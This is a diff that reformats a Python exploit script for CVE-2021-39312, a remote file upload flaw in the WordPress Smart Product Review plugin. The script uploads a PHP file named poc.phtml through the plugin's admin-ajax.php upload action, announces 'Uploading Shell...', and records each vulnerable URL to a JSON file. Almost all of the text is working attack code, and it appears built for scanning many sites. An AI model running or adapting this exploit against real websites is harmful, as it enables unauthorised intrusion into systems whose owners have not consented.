@@ -2,19 +2,18 @@ import sys
 import os
 try:
     # The insertion index should be 1 because index 0 is this file
-    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
+    sys.path.insert(1, '{}/help'.format(
+        os.getcwd()))  # the type of path is string
     # because the system path already have the absolute path to folder a
-    # so it can recognize file_a.py while searching 
+    # so it can recognize file_a.py while searching
     from help.banner import colors
     from help.json_me import json_me
     from help.req import request
-    
+
 except (ModuleNotFoundError, ImportError) as e:
     print("{} fileure".format(type(e)))
 else:
     print("Import succeeded")
-
-
 
 
 def exploit(url):
@@ -23,8 +22,10 @@ def exploit(url):
     req = request(url)
     found = []
     try:
-        files = {'files': (
-            'poc.phtml', '<?php echo "poc By eng Yazeed"; ?>', 'application/html')}
+        files = {
+            'files': ('poc.phtml', '<?php echo "poc By eng Yazeed"; ?>',
+                      'application/html')
+        }
 
         data = {
             "allowedExtensions[0]": "jpg",
@@ -38,20 +39,29 @@ def exploit(url):
         }
         print("Uploading Shell...")
         _POST = req.post(
-            f"{url}/wp-admin/admin-ajax.php?action=sprw_file_upload_action", files=files, data=data)
+            f"{url}/wp-admin/admin-ajax.php?action=sprw_file_upload_action",
+            files=files,
+            data=data)
         if _POST.status_code == 200:
-            print(
-                colors.yellow + "[+] ==> Smart Product Review %s  Likely to be Vulnerable" % url)
+            print(colors.yellow +
+                  "[+] ==> Smart Product Review %s  Likely to be Vulnerable" %
+                  url)
             if "ok" in _POST.text:
                 print(
-                    colors.cyan + "[+] ==> Shell Uploaded Successfully  ==> AND  Its Vulnerable %s" % url)
+                    colors.cyan +
+                    "[+] ==> Shell Uploaded Successfully  ==> AND  Its Vulnerable %s"
+                    % url)
                 found.append({
-                    "url": url,
-                    "payload": "poc.phtml",
-                    "status": _POST.status_code,
-                    "exploit": "CVE-2021-39312",
-                    "vuln": "WordPress Plugin Smart Product Review <= 1.0.1 - Remote File Upload"
-
+                    "url":
+                    url,
+                    "payload":
+                    "poc.phtml",
+                    "status":
+                    _POST.status_code,
+                    "exploit":
+                    "CVE-2021-39312",
+                    "vuln":
+                    "WordPress Plugin Smart Product Review <= 1.0.1 - Remote File Upload"
                 })
                 json_me(url, "CVE-2021-39312", found)
             else:
@@ -66,5 +76,3 @@ def exploit(url):
         print(e)
 
         pass
-
-
